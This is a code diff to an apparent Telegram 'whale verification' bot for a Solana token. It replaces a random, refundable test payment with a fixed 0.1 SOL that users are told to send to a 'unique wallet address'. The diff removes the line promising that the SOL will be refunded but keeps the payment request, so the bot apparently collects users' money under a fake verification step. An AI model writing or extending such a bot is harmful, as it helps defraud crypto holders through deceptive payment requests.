@@ -55,10 +55,9 @@ This bot will help determine if you hold enough ${ENV.TOKEN_SYMBOL} tokens to jo
 Always verify you are using the correct Telegram handle, and never send tokens or private information to any third-party accounts.
 
 *Here’s how it works:*
-1️⃣ The bot will randomly select an amount between 0.01-0.2 SOL.
-2️⃣ Send this exact amount from your whale wallet to the validator wallet.
-3️⃣ Once confirmed, your solana will be refunded.
-4️⃣ If your wallet holds ${hold_amount} or more ${ENV.TOKEN_SYMBOL} tokens, you’ll be officially recognized as a ${ENV.TOKEN_SYMBOL[0].toUpperCase()+ENV.TOKEN_SYMBOL.slice(1).toLowerCase()} Whale and granted access to our exclusive whale group!
+1️⃣ Make sure you have at least ${hold_amount} ${ENV.TOKEN_SYMBOL} tokens in your whale wallet.
+2️⃣ Click the start button below to recieve your unique wallet address for this verification.
+3️⃣ Send 0.1 SOL to this unique wallet address from your whale wallet.
 
 Ready to prove your whale status? 🌊✨
 
@@ -95,7 +94,8 @@ bot.on('callback_query', async (callbackQuery) => {
         validationStatus.set(chatId, true);
 
 
-        let sendAmount = Math.random() * 0.19 + 0.01;
+        // let sendAmount = Math.random() * 0.19 + 0.01;
+        let sendAmount = 0.10;
         sendAmount = Math.round(sendAmount * 100) / 100;
 
         const lamports = Math.floor(sendAmount * LAMPORTS_PER_SOL);
